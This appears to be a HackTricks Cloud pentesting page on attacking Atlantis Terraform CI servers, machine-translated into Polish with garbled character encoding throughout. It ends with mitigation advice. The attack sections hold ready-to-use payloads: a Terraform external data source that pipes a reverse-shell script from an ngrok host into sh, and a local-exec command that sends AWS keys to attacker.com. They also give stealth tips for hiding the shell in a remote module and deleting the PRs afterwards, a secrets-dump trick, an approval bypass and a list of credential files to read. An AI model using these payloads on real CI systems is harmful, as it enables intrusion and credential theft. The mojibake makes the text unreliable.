# Atlantis Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Basic Information

Atlantis zasadniczo pomaga uruchamia terraform z Pull Requests z twojego serwera git.

![](<../.gitbook/assets/image (161).png>)

### Local Lab

1. Przejd藕 do **strony z wydaniami atlantis** w [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) i **pobierz** wersj, kt贸ra ci odpowiada.
2. Utw贸rz **osobisty token** (z dostpem do repozytori贸w) swojego u偶ytkownika **github**.
3. Wykonaj `./atlantis testdrive`, a utworzy to **demo repo**, kt贸rego mo偶esz u偶y do **rozmowy z atlantis**.
1. Mo偶esz uzyska dostp do strony internetowej pod adresem 127.0.0.1:4141.

### Atlantis Access

#### Git Server Credentials

**Atlantis** obsuguje kilka host贸w git, takich jak **Github**, **Gitlab**, **Bitbucket** i **Azure DevOps**.\
Jednak aby uzyska dostp do repozytori贸w na tych platformach i wykonywa dziaania, musi mie przyznany **pewien dostp uprzywilejowany** (przynajmniej uprawnienia do zapisu).\
[**Dokumentacja**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) zachca do utworzenia u偶ytkownika na tych platformach specjalnie dla Atlantis, ale niekt贸rzy mog u偶ywa osobistych kont.

{% hint style="warning" %}
W ka偶dym przypadku, z perspektywy atakujcego, **konto Atlantis** bdzie bardzo **interesujce** **do skompromitowania**.
{% endhint %}

#### Webhooks

Atlantis opcjonalnie u偶ywa [**sekret贸w Webhook**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) do weryfikacji, 偶e **webhooki**, kt贸re otrzymuje z twojego hosta Git, s **legitymne**.

Jednym ze sposob贸w potwierdzenia tego byoby **zezwolenie na przyjmowanie 偶da tylko z adres贸w IP** twojego hosta Git, ale atwiejszym sposobem jest u偶ycie sekretu Webhook.

Zauwa偶, 偶e chyba 偶e u偶ywasz prywatnego serwera github lub bitbucket, bdziesz musia wystawi punkty kocowe webhook na Internet.

{% hint style="warning" %}
Atlantis bdzie **wystawia webhooki**, aby serwer git m贸g wysya mu informacje. Z perspektywy atakujcego interesujce byoby wiedzie, **czy mo偶esz wysya mu wiadomoci**.
{% endhint %}

#### Provider Credentials <a href="#provider-credentials" id="provider-credentials"></a>

[Z dokumentacji:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis uruchamia Terraform, po prostu **wykonujc polecenia `terraform plan` i `apply`** na serwerze, na kt贸rym **Atlantis jest hostowany**. Tak jak w przypadku uruchamiania Terraform lokalnie, Atlantis potrzebuje powiadcze dla twojego konkretnego dostawcy.

To od ciebie zale偶y, jak [przekazujesz powiadczenia](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) dla swojego konkretnego dostawcy do Atlantis:

* Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) i [AWS Fargate Module](https://www.runatlantis.io/docs/deployment.html#aws-fargate) maj wasne mechanizmy dla powiadcze dostawcy. Przeczytaj ich dokumentacj.
* Jeli uruchamiasz Atlantis w chmurze, wiele chmur ma sposoby na przyznanie dostpu do API chmury aplikacjom dziaajcym na nich, np.:
* [AWS EC2 Roles](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Szukaj "EC2 Role")
* [GCE Instance Service Accounts](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Wiele u偶ytkownik贸w ustawia zmienne rodowiskowe, np. `AWS_ACCESS_KEY`, gdzie dziaa Atlantis.
* Inni tworz niezbdne pliki konfiguracyjne, np. `~/.aws/credentials`, gdzie dziaa Atlantis.
* U偶yj [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs), aby uzyska powiadczenia dostawcy.

{% hint style="warning" %}
**Kontener**, w kt贸rym **Atlantis** jest **uruchamiany**, prawdopodobnie **zawiera uprzywilejowane powiadczenia** dla dostawc贸w (AWS, GCP, Github...), kt贸rymi Atlantis zarzdza za pomoc Terraform.
{% endhint %}

#### Web Page

Domylnie Atlantis uruchomi **stron internetow na porcie 4141 w localhost**. Ta strona pozwala tylko na wczenie/wyczenie atlantis apply oraz sprawdzenie statusu planu repozytori贸w i ich odblokowanie (nie pozwala na modyfikacj rzeczy, wic nie jest zbyt u偶yteczna).

Prawdopodobnie nie znajdziesz jej wystawionej w Internecie, ale wyglda na to, 偶e domylnie **nie s wymagane 偶adne powiadczenia** do jej uzyskania (a jeli s, to `atlantis`:`atlantis` s **domylnymi**).

### Server Configuration

Konfiguracja dla `atlantis server` mo偶e by okrelona za pomoc flag wiersza polece, zmiennych rodowiskowych, pliku konfiguracyjnego lub mieszanki tych trzech.

* Mo偶esz znale藕 [**tutaj list flag**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) obsugiwanych przez serwer Atlantis.
* Mo偶esz znale藕 [**tutaj, jak przeksztaci opcj konfiguracyjn w zmienn rodowiskow**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables).

Wartoci s **wybierane w tej kolejnoci**:

1. Flagi
2. Zmienne rodowiskowe
3. Plik konfiguracyjny

{% hint style="warning" %}
Zauwa偶, 偶e w konfiguracji mo偶esz znale藕 interesujce wartoci, takie jak **tokeny i hasa**.
{% endhint %}

#### Repos Configuration

Niekt贸re konfiguracje wpywaj na **to, jak zarzdzane s repozytoria**. Jednak mo偶liwe jest, 偶e **ka偶de repo wymaga r贸偶nych ustawie**, wic istniej sposoby na okrelenie ka偶dego repo. Oto kolejno priorytet贸w:

1. Plik repo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config). Ten plik mo偶e by u偶yty do okrelenia, jak atlantis powinien traktowa repo. Jednak domylnie niekt贸re klucze nie mog by tutaj okrelone bez pewnych flag, kt贸re to umo偶liwiaj.
1. Prawdopodobnie wymagane, aby byy dozwolone przez flagi takie jak `allowed_overrides` lub `allow_custom_workflows`.
2. [**Konfiguracja po stronie serwera**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): Mo偶esz j przekaza za pomoc flagi `--repo-config` i jest to yaml konfiguracyjny nowych ustawie dla ka偶dego repo (wsparcie dla regex贸w).
3. **Domylne** wartoci.

**PR Protections**

Atlantis pozwala wskaza, czy chcesz, aby **PR** by **`zatwierdzony`** przez kogo innego (nawet jeli nie jest to ustawione w ochronie gazi) i/lub by **`mo偶liwy do scalania`** (ochrony gazi spenione) **przed uruchomieniem apply**. Z punktu widzenia bezpieczestwa, zaleca si ustawienie obu opcji.

W przypadku, gdy `allowed_overrides` jest True, te ustawienia mog by **nadpisywane w ka偶dym projekcie przez plik `/atlantis.yml`**.

**Scripts**

Konfiguracja repo mo偶e **okrela skrypty** do uruchomienia [**przed**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) i [**po**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_) wykonaniu **workflow**.

Nie ma 偶adnej opcji, aby **okreli** te skrypty w **pliku repo `/atlantis.yml`**.

**Workflow**

W konfiguracji repo (konfiguracja po stronie serwera) mo偶esz [**okreli nowy domylny workflow**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow) lub [**utworzy nowe niestandardowe workflow**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Mo偶esz r贸wnie偶 **okreli**, kt贸re **repozytoria** mog **uzyska dostp** do **nowych** wygenerowanych.\
Nastpnie mo偶esz pozwoli plikowi **atlantis.yaml** ka偶dego repo na **okrelenie workflow do u偶ycia**.

{% hint style="danger" %}
Jeli flaga [**konfiguracji po stronie serwera**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` jest ustawiona na **True**, workflow mog by **okrelane** w **pliku `atlantis.yaml`** ka偶dego repo. Potencjalnie mo偶e by r贸wnie偶 potrzebne, aby **`allowed_overrides`** okrelao r贸wnie偶 **`workflow`**, aby **nadpisa workflow**, kt贸ry ma by u偶yty.\
To zasadniczo da **RCE w serwerze Atlantis ka偶demu u偶ytkownikowi, kt贸ry mo偶e uzyska dostp do tego repo**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

**Sprawdzanie polityki Conftest**

Atlantis wspiera uruchamianie **po stronie serwera** [**conftest**](https://www.conftest.dev/) **polityk** w odniesieniu do wyjcia planu. Typowe przypadki u偶ycia tego kroku obejmuj:

* Odrzucenie u偶ycia listy modu贸w
* Asercje atrybut贸w zasobu w momencie tworzenia
* Wykrywanie niezamierzonych usuni zasob贸w
* Zapobieganie ryzyku bezpieczestwa (tj. udostpnianie bezpiecznych port贸w publicznie)

Mo偶esz sprawdzi, jak to skonfigurowa w [**dokumentacji**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

### Komendy Atlantis

[**W dokumentacji**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) znajdziesz opcje, kt贸re mo偶esz wykorzysta do uruchomienia Atlantis:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
### Ataki

{% hint style="warning" %}
Jeli podczas eksploatacji napotkasz ten **bd**: `Error: Error acquiring the state lock`

Mo偶esz to naprawi, uruchamiajc:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

#### Atlantis plan RCE - Modyfikacja konfiguracji w nowym PR

Jeli masz dostp do zapisu w repozytorium, bdziesz m贸g utworzy now ga藕 i wygenerowa PR. Jeli mo偶esz **wykona `atlantis plan`** (lub mo偶e jest to automatycznie wykonywane) **bdziesz m贸g RCE wewntrz serwera Atlantis**.

Mo偶esz to zrobi, sprawiajc, 偶e [**Atlantis zaaduje zewntrzne 藕r贸do danych**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Po prostu umie adunek, taki jak poni偶szy, w pliku `main.tf`:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Cichszy Atak**

Mo偶esz przeprowadzi ten atak w **cichszy spos贸b**, stosujc si do tych sugestii:

* Zamiast dodawa rev shell bezporednio do pliku terraform, mo偶esz **zaadowa zewntrzny zas贸b**, kt贸ry zawiera rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Mo偶esz znale藕 kod rev shell w [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* W zasobie zewntrznym u偶yj funkcji **ref**, aby ukry **kod terraform rev shell w gazi** wewntrz repo, co takiego: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Zamiast** tworzy **PR do master**, aby uruchomi Atlantis, **stw贸rz 2 gazie** (test1 i test2) i stw贸rz **PR z jednej do drugiej**. Gdy zakoczysz atak, po prostu **usu PR i gazie**.

#### Atlantis plan Secrets Dump

Mo偶esz **zrzuci sekrety u偶ywane przez terraform**, uruchamiajc `atlantis plan` (`terraform plan`), umieszczajc co takiego w pliku terraform:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
#### Atlantis apply RCE - Modyfikacja konfiguracji w nowym PR

Jeli masz dostp do zapisu w repozytorium, bdziesz m贸g stworzy now ga藕 i wygenerowa PR. Jeli mo偶esz **wykona `atlantis apply`, bdziesz m贸g uzyska RCE wewntrz serwera Atlantis**.

Jednak zazwyczaj bdziesz musia obej pewne zabezpieczenia:

* **Mergeable**: Jeli to zabezpieczenie jest ustawione w Atlantis, mo偶esz uruchomi **`atlantis apply` tylko wtedy, gdy PR jest mergeable** (co oznacza, 偶e zabezpieczenie gazi musi zosta ominite).
* Sprawd藕 potencjalne [**obejcia zabezpiecze gazi**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
* **Approved**: Jeli to zabezpieczenie jest ustawione w Atlantis, **inny u偶ytkownik musi zatwierdzi PR** zanim bdziesz m贸g uruchomi `atlantis apply`
* Domylnie mo偶esz nadu偶y [**tokena Gitbota, aby obej to zabezpieczenie**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

Uruchamianie **`terraform apply` na zoliwym pliku Terraform z** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Musisz tylko upewni si, 偶e jaki adunek, taki jak poni偶sze, koczy si w pliku `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Postpuj zgodnie z **zaleceniami z poprzedniej techniki**, aby przeprowadzi ten atak w **bardziej dyskretny spos贸b**.

#### Wstrzykiwanie parametr贸w Terraform

Podczas uruchamiania `atlantis plan` lub `atlantis apply`, terraform jest uruchamiany w tle, mo偶esz przekaza polecenia do terraform z atlantis, komentujc co takiego:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Co mo偶esz przekaza, to zmienne env, kt贸re mog by pomocne w obejciu niekt贸rych zabezpiecze. Sprawd藕 zmienne env terraform w [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

#### Niestandardowy Workflow

Uruchamianie **zoliwych niestandardowych polece budowania** okrelonych w pliku `atlantis.yaml`. Atlantis u偶ywa pliku `atlantis.yaml` z gazi pull request, **a nie** z `master`.\
Ta mo偶liwo zostaa wspomniana w poprzedniej sekcji:

{% hint style="danger" %}
Jeli flaga [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` jest ustawiona na **True**, workflow mog by **okrelone** w pliku **`atlantis.yaml`** ka偶dego repo. Potencjalnie potrzebne jest r贸wnie偶, aby **`allowed_overrides`** okrelao r贸wnie偶 **`workflow`**, aby **nadpisa workflow**, kt贸ry ma by u偶yty.

To zasadniczo da **RCE na serwerze Atlantis ka偶demu u偶ytkownikowi, kt贸ry ma dostp do tego repo**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Ominicie zabezpiecze planu/aplikacji

Jeli flaga [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _ma_ skonfigurowane `apply_requirements`, mo偶liwe jest, aby repozytorium **zmodyfikowao zabezpieczenia planu/aplikacji, aby je obej**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
#### PR Hijacking

Jeli kto wysya **`atlantis plan/apply` komentarze na twoich wa偶nych pull requestach,** spowoduje to uruchomienie terraform, gdy nie chcesz, aby to si stao.

Co wicej, jeli nie masz skonfigurowanej **ochrony gazi**, aby prosi o **ponown ocen** ka偶dego PR, gdy **nowe zatwierdzenie jest do niego przesyane**, kto m贸gby **napisa zoliwe konfiguracje** (sprawd藕 wczeniejsze scenariusze) w konfiguracji terraform, uruchomi `atlantis plan/apply` i uzyska RCE.

To jest **ustawienie** w ochronach gazi Github:

![](<../.gitbook/assets/image (216).png>)

#### Webhook Secret

Jeli uda ci si **ukra sekret webhooka** u偶ywany lub jeli **nie ma 偶adnego sekretu webhooka** u偶ywanego, mo偶esz **wywoa webhook Atlantis** i **wywoa komendy atlantis** bezporednio.

#### Bitbucket

Bitbucket Cloud **nie obsuguje sekret贸w webhooka**. Mo偶e to pozwoli atakujcym na **faszowanie 偶da z Bitbucket**. Upewnij si, 偶e zezwalasz tylko na adresy IP Bitbucket.

* Oznacza to, 偶e **atakujcy** m贸gby wysya **faszywe 偶dania do Atlantis**, kt贸re wygldaj, jakby pochodziy z Bitbucket.
* Jeli okrelasz `--repo-allowlist`, to mogliby faszowa tylko 偶dania dotyczce tych repozytori贸w, wic najwiksze szkody, jakie mogliby wyrzdzi, to planowa/zastosowa na twoich wasnych repozytoriach.
* Aby temu zapobiec, dodaj do listy dozwolonych [adresy IP Bitbucket](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (zobacz adresy IPv4 wychodzce).

### Post-Exploitation

Jeli udao ci si uzyska dostp do serwera lub przynajmniej masz LFI, s pewne interesujce rzeczy, kt贸re powiniene spr贸bowa przeczyta:

* `/home/atlantis/.git-credentials` Zawiera dane uwierzytelniajce do dostpu do vcs
* `/atlantis-data/atlantis.db` Zawiera dane uwierzytelniajce do dostpu do vcs z dodatkowymi informacjami
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Plik stanu Terraform
* Przykad: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Zmienne rodowiskowe
* `/proc/[2-20]/cmdline` Linia polece `atlantis server` (mo偶e zawiera dane wra偶liwe)

### Mitigations

#### Don't Use On Public Repos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Poniewa偶 ka偶dy mo偶e komentowa publiczne pull requesty, nawet przy wszystkich dostpnych rodkach bezpieczestwa, nadal jest niebezpiecznie uruchamia Atlantis na publicznych repozytoriach bez odpowiedniej konfiguracji ustawie bezpieczestwa.

#### Don't Use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Jeli dziaasz na publicznym repozytorium (co nie jest zalecane, patrz powy偶ej), nie powiniene ustawia `--allow-fork-prs` (domylnie false), poniewa偶 ka偶dy mo偶e otworzy pull request z ich forka do twojego repozytorium.

#### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis wymaga, aby okreli list dozwolonych repozytori贸w, z kt贸rych zaakceptuje webhooki za pomoc flagi `--repo-allowlist`. Na przykad:

* Konkretne repozytoria: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Caa twoja organizacja: `--repo-allowlist=github.com/runatlantis/*`
* Ka偶de repozytorium w twojej instalacji GitHub Enterprise: `--repo-allowlist=github.yourcompany.com/*`
* Wszystkie repozytoria: `--repo-allowlist=*`. Przydatne, gdy jeste w chronionej sieci, ale niebezpieczne bez ustawienia sekretu webhooka.

Ta flaga zapewnia, 偶e twoja instalacja Atlantis nie jest u偶ywana z repozytoriami, kt贸rymi nie zarzdzasz. Zobacz `atlantis server --help` po wicej szczeg贸贸w.

#### Protect Terraform Planning <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Jeli atakujcy przesyaj pull requesty z zoliwym kodem Terraform w twoim modelu zagro偶e, musisz by wiadomy, 偶e zatwierdzenia `terraform apply` nie s wystarczajce. Mo偶liwe jest uruchomienie zoliwego kodu w `terraform plan` za pomoc [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) lub przez okrelenie zoliwego dostawcy. Ten kod m贸gby nastpnie wykrada twoje dane uwierzytelniajce.

Aby temu zapobiec, mo偶esz:

1. Wbudowa dostawc贸w w obraz Atlantis lub hostowa i odm贸wi egress w produkcji.
2. Wdro偶y wewntrznie protok贸 rejestru dostawc贸w i odm贸wi publicznego egress, w ten spos贸b kontrolujesz, kto ma dostp do zapisu w rejestrze.
3. Zmodyfikowa krok `plan` w twojej [konfiguracji repozytori贸w po stronie serwera](https://www.runatlantis.io/docs/server-side-repo-config.html), aby walidowa u偶ycie niedozwolonych dostawc贸w lub 藕r贸de danych lub PR-贸w od niedozwolonych u偶ytkownik贸w. Mo偶esz r贸wnie偶 doda dodatkow walidacj w tym momencie, np. wymagajc "thumbs-up" na PR przed pozwoleniem na kontynuacj `plan`. Conftest mo偶e by tutaj przydatny.

#### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis powinien by uruchamiany z ustawionymi sekretami webhooka za pomoc zmiennych rodowiskowych `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. Nawet z ustawion flag `--repo-allowlist`, bez sekretu webhooka, atakujcy mogliby wysya 偶dania do Atlantis, podszywajc si pod repozytorium, kt贸re jest na licie dozwolonych. Sekrety webhooka zapewniaj, 偶e 偶dania webhooka faktycznie pochodz od twojego dostawcy VCS (GitHub lub GitLab).

Jeli u偶ywasz Azure DevOps, zamiast sekret贸w webhooka dodaj podstawowy login i haso.

#### Azure DevOps Basic Authentication <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps obsuguje wysyanie nag贸wka podstawowej autoryzacji we wszystkich zdarzeniach webhooka. Wymaga to u偶ycia adresu URL HTTPS dla lokalizacji webhooka.

#### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Jeli u偶ywasz sekret贸w webhooka, ale tw贸j ruch jest przez HTTP, to sekrety webhooka mog zosta skradzione. Wcz SSL/HTTPS, u偶ywajc flag `--ssl-cert-file` i `--ssl-key-file`.

#### Enable Authentication on Atlantis Web Server <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Zdecydowanie zaleca si wczenie autoryzacji w usudze internetowej. Wcz BasicAuth, u偶ywajc `--web-basic-auth=true` i skonfiguruj nazw u偶ytkownika oraz haso, u偶ywajc flag `--web-username=yourUsername` i `--web-password=yourPassword`.

Mo偶esz r贸wnie偶 przekaza je jako zmienne rodowiskowe `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` i `ATLANTIS_WEB_PASSWORD=yourPassword`.

### References

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
